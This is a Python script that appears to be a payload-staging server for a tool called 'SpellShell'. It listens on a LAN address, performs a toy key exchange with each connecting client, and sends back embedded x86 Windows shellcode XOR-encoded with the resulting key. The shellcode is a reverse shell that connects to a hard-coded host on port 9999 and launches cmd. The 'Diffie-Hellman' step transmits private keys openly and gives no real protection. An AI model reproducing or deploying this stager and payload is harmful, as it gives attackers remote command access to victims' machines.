import socket
import sys
import subprocess
import threading

IP = '192.168.0.144'
PORT = 9999
ADDR = (IP, PORT)
FORMAT = "utf-8"
data_recv = ''

buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x95\x68"
buf += b"\x02\x00\x27\x0f\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"


def defi_helmen(conn, addr):
    P, G, a, A, B, S1, S2 = 23, 9, 4, 0, 0, 0, 0
    print("[+] - Sending Servers Private Key: ", a )
    conn.send(a.to_bytes(3, 'little'))
    b = conn.recv(1024); b = int(b.decode())
    print("[+] - Recieving Clients Private Key: ", b )
    A = pow(G, a) % P
    conn.send(A.to_bytes(3, 'little'))
    print("[+] - Sending Servers Calculated A: ", A )
    B = conn.recv(1024); B = int(B.decode())
    print("[+] - Recieving Clientss Calculated B: ", B )
    S1 = pow(A, b) % P
    conn.send(S1.to_bytes(3, 'little'))
    print("[+] - Sending Secret key 01: ", S1 )
    S2 = conn.recv(1024); S2= int(S2.decode())
    print("[+] - Recieving Secret key 02: ", S2 )
    return S2

def payload(S2):
    lol=b""
    for i in range(len(buf)):
        lol+=(buf[i]^S2).to_bytes(1, "little")
    
    print(lol)
    print(len(buf)==len(lol))
    return lol

def client_handler(conn, address):
    print(f"[+] - Server Conneted to client at [{address[0]} ] : [ {address[1]}]")
    print(f"[+] - Active Connections: {threading.active_count() - 1}")
    print(f"[+] - Connection Recieved From [{address[0]}] : [{address[1]}]")
    conn.send(b"Are you spellshell?")
    data_recv = conn.recv(1024)
    if data_recv == "YES" or data_recv == 'yes':
        print(f"[+] - Connected to SpellShell at [{address[0]}] : [{address[1]}]")
    else:
        print(f"[+] - Connected to PowerShell or MsfVenom Shell at [{address[0]}] : [{address[1]}]")
        S2 = defi_helmen(conn, address)
        bomb = payload(S2)
        conn.send(bomb)



def main(ip, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    server.listen()
    print(f"[+] - Server Listening on [{IP}] : [{PORT}]")
    while True:
        conn, address = server.accept()
        thread = threading.Thread(target = client_handler, args = (conn, address)).start()

main(IP, PORT)